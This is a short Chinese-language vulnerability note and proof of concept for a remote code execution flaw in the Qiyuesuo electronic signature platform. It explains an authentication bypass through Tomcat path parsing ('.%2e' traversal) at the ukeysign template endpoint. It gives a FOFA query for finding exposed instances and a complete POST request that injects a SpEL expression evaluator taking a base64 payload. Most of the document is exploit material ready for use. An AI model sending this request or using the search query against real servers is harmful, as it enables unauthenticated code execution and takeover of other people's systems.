# 契约锁电子签章平台ukeysign存在远程命令执行漏洞

契约锁电子签章平台 `/contract/ukeysign/.%2e/.%2e/template/param/edits `接口处存在远程代码执行漏洞，未经身份验证的攻击者可通过tomcat对路径参数解析不正当的特性绕过权限认证在目标执行恶意代码，获取服务器权限。经过分析和研判，该漏洞利用难度低，可导致远程代码执行，建议尽快修复。

## fofa

```java
app="契约锁-电子签署平台"
```

## poc

```java
POST /contract/ukeysign/.%2e/.%2e/template/param/edits HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: application/json

{"id":"2","params":[{"expression":"var a=new 
org.springframework.expression.spel.standard.SpelExpressionParser();var b='SpEL 表达式的 base64 编
码';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-
8');var c=a.parseExpression(deStr);c.getValue();"}]}
```

